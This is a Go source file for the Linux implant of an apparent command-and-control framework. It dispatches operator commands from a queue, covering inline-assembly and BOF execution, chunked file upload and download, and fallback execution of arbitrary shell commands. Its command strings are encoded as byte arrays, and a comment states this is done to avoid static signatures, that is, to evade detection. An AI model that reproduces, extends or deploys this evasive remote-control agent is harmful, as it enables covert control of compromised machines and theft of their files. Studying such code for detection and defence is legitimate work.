// server/docker/payloads/Linux/command_processor.go

//go:build linux
// +build linux

package main

import (
	"encoding/json"
	"fmt"
	//"os"
	"strings"
	"time"
)

// Command processor strings (constructed to avoid static signatures)
var (
	// Command names
	cpCmdInlineAssemblyJobs      = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6a, 0x6f, 0x62, 0x73})                               // inline-assembly-jobs
	cpCmdInlineAssemblyJobsClean = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6a, 0x6f, 0x62, 0x73, 0x2d, 0x63, 0x6c, 0x65, 0x61, 0x6e}) // inline-assembly-jobs-clean
	cpCmdInlineAssemblyJobsStats = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6a, 0x6f, 0x62, 0x73, 0x2d, 0x73, 0x74, 0x61, 0x74, 0x73}) // inline-assembly-jobs-stats
	cpCmdInlineAssemblyOutput    = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74})                         // inline-assembly-output
	cpCmdInlineAssemblyOutputSp  = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x20})                   // inline-assembly-output (with space)
	cpCmdInlineAssemblyKill      = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6b, 0x69, 0x6c, 0x6c})                                     // inline-assembly-kill
	cpCmdInlineAssemblyKillSp    = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6b, 0x69, 0x6c, 0x6c, 0x20})                               // inline-assembly-kill (with space)
	cpCmdInlineAssembly          = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79})                                                                   // inline-assembly
	cpCmdInlineAssemblyAsync     = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x61, 0x73, 0x79, 0x6e, 0x63})                               // inline-assembly-async
	cpCmdBof                     = string([]byte{0x62, 0x6f, 0x66})                                                                                                                                           // bof
	cpCmdUpload                  = string([]byte{0x75, 0x70, 0x6c, 0x6f, 0x61, 0x64})                                                                                                                         // upload
	cpCmdDownload                = string([]byte{0x64, 0x6f, 0x77, 0x6e, 0x6c, 0x6f, 0x61, 0x64})                                                                                                             // download
	cpWordAsync                  = string([]byte{0x61, 0x73, 0x79, 0x6e, 0x63})                                                                                                                               // async

	// Error message suffixes
	cpErrNotRegistered = string([]byte{0x20, 0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x20, 0x6e, 0x6f, 0x74, 0x20, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x65, 0x64})                             //  command not registered
	cpErrHandlerNotReg = string([]byte{0x20, 0x68, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x72, 0x20, 0x6e, 0x6f, 0x74, 0x20, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x65, 0x64})                             //  handler not registered
)

// ProcessNextCommand processes the next command in the queue
func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
	cq.mu.Lock()
	if len(cq.commands) == 0 {
		cq.mu.Unlock()
		return nil, nil
	}

	cmd := cq.commands[0]
	cq.commands = cq.commands[1:]
	cq.mu.Unlock()

	// Add this diagnostic
	//fmt.Fprintf(os.Stderr, "DIAGNOSTIC: Processing command type: %s\n", cmd.Command)
	//if strings.Contains(fmt.Sprintf("%v", cmd), "command_id") {
	//	fmt.Fprintf(os.Stderr, "WARNING: Command struct would print as: %v\n", cmd)
	//}

	// Set the current command in context
	cq.cmdContext.mu.Lock()
	cq.cmdContext.CurrentCommand = &cmd
	cq.cmdContext.mu.Unlock()

	// IMPORTANT: Apply session environment variables before executing any command
	cq.applySessionEnvironment()

	// IMPORTANT: Handle inline-assembly job management commands FIRST
	// These commands don't have data and should be processed before the data check
	if cmd.Command == cpCmdInlineAssemblyJobs {
		if handler, exists := cq.cmdRegistry[cpCmdInlineAssemblyJobs]; exists {
			result := handler.Execute(cq.cmdContext, []string{})
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		} else {
			return &CommandResult{
				Command:     cmd,
				ErrorString: cpCmdInlineAssemblyJobs + cpErrNotRegistered,
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}
	}

	// Handle inline-assembly-jobs-clean command
	if strings.HasPrefix(cmd.Command, cpCmdInlineAssemblyJobsClean) {
		parts := strings.Fields(cmd.Command)
		if handler, exists := cq.cmdRegistry[cpCmdInlineAssemblyJobsClean]; exists {
			args := []string{}
			if len(parts) > 1 {
				args = parts[1:] // Pass the job ID if provided
			}
			result := handler.Execute(cq.cmdContext, args)
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly-jobs-stats command
	if cmd.Command == cpCmdInlineAssemblyJobsStats {
		if handler, exists := cq.cmdRegistry[cpCmdInlineAssemblyJobsStats]; exists {
			result := handler.Execute(cq.cmdContext, []string{})
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly-output command WITH arguments
	if strings.HasPrefix(cmd.Command, cpCmdInlineAssemblyOutputSp) {
		parts := strings.Fields(cmd.Command)
		if handler, exists := cq.cmdRegistry[cpCmdInlineAssemblyOutput]; exists {
			args := []string{}
			if len(parts) > 1 {
				args = parts[1:] // Pass the job ID as argument
			}
			result := handler.Execute(cq.cmdContext, args)
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly-kill command WITH arguments
	if strings.HasPrefix(cmd.Command, cpCmdInlineAssemblyKillSp) {
		parts := strings.Fields(cmd.Command)
		if handler, exists := cq.cmdRegistry[cpCmdInlineAssemblyKill]; exists {
			args := []string{}
			if len(parts) > 1 {
				args = parts[1:] // Pass the job ID as argument
			}
			result := handler.Execute(cq.cmdContext, args)
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// NOW handle inline-assembly commands WITH data (actual assembly execution)
	if strings.HasPrefix(cmd.Command, cpCmdInlineAssembly) && cmd.Data != "" {

		// Parse the JSON data to check if it's valid
		var testParse map[string]interface{}
		if err := json.Unmarshal([]byte(cmd.Data), &testParse); err != nil {
		} else {
		}

		// Determine if it's async or regular
		handlerName := cpCmdInlineAssembly
		if strings.Contains(cmd.Command, cpWordAsync) {
			handlerName = cpCmdInlineAssemblyAsync
		}

		// Execute using the appropriate handler
		if handler, exists := cq.cmdRegistry[handlerName]; exists {
			result := handler.Execute(cq.cmdContext, []string{})
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		} else {
			return &CommandResult{
				Command:     cmd,
				ErrorString: handlerName + cpErrHandlerNotReg,
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}
	}

	// Handle upload chunks
	if cmd.Command == cpCmdUpload && cmd.Data != "" {
		result, err := HandleUploadChunk(cmd, cq.cmdContext)
		if err != nil {
			return &CommandResult{
				Command:     cmd,
				Error:       err,
				ErrorString: err.Error(),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}
		return result, nil
	}

	// Handle download continuation
	if cmd.Filename != "" && cmd.CurrentChunk > 0 {

		cq.mu.Lock()
		downloadInfo, exists := cq.activeDownloads[cmd.Filename]
		cq.mu.Unlock()

		if !exists {
			return &CommandResult{
				Command:     cmd,
				Error:       fmt.Errorf(Err(E4)),
				ErrorString: Err(E4),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}

		if !downloadInfo.InProgress {
			return &CommandResult{
				Command:     cmd,
				Error:       fmt.Errorf(Err(E4)),
				ErrorString: Err(E4),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}

		result, err := GetNextFileChunk(downloadInfo.FilePath, cmd.CurrentChunk, cmd)
		if err != nil {
			return &CommandResult{
				Command:     cmd,
				Error:       err,
				ErrorString: err.Error(),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}

		cq.UpdateDownloadProgress(cmd.Filename, cmd.CurrentChunk)

		return result, nil
	}

	// Parse command for everything else
	cmdType := cmd.Command
	var cmdArgs []string

	// For BOF commands and variants, handle them specially
	if strings.HasPrefix(cmdType, cpCmdBof) {
		parts := strings.Fields(cmd.Command)
		if len(parts) > 0 {
			cmdType = parts[0]
			cmdArgs = parts[1:]
		}
	} else {
		// Normal command processing
		// Special handling for download and upload commands to preserve spaces in file paths
		var args []string
		cmdLower := strings.ToLower(strings.TrimSpace(cmd.Command))

		if strings.HasPrefix(cmdLower, cpCmdDownload) {
			// Use special parsing for download that treats everything after "download" as one argument
			args = parseDownloadCommand(cmd.Command)
		} else if strings.HasPrefix(cmdLower, cpCmdUpload) {
			// Use special parsing for upload that treats everything after "upload" as one argument
			args = parseUploadCommand(cmd.Command)
		} else {
			// Use improved general parser for all other commands
			args = parseCommandLine(cmd.Command)
		}

		if len(args) == 0 {
			return &CommandResult{
				Command:     cmd,
				Error:       fmt.Errorf(Err(E1)),
				ErrorString: Err(E1),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}
		cmdType = args[0]
		cmdArgs = args[1:]
	}


	// Look up command handler by numeric ID
	if handler, exists := cq.cmdHandlers[cmd.CommandType]; exists {
		result := handler(cq.cmdContext, cmdArgs)

		// For file operations (download/upload), preserve the data from the handler
		if (cmd.CommandType == CmdDownload || cmd.CommandType == CmdUpload) &&
			(result.Command.Filename != "" || result.Command.Data != "") {
			// The handler set file operation data, merge with original command metadata
			result.Command.CommandID = cmd.CommandID
			result.Command.CommandDBID = cmd.CommandDBID
			result.Command.AgentID = cmd.AgentID
			result.Command.Timestamp = cmd.Timestamp
			// Keep the file data from the handler (Filename, CurrentChunk, TotalChunks, Data)
		} else {
			// For non-file operations, use the original command
			result.Command = cmd
		}

		result.CompletedAt = time.Now().Format(time.RFC3339)
		return &result, nil
	}

	// If no handler found (CommandType == CmdUnknown or unregistered), try shell command
	output, err := executeShellCommand(cmd.Command)
	if err != nil {
		return &CommandResult{
			Command:     cmd,
			Output:      output,
			Error:       err,
			ErrorString: err.Error(),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}, nil
	}

	return &CommandResult{
		Command:     cmd,
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}, nil
}
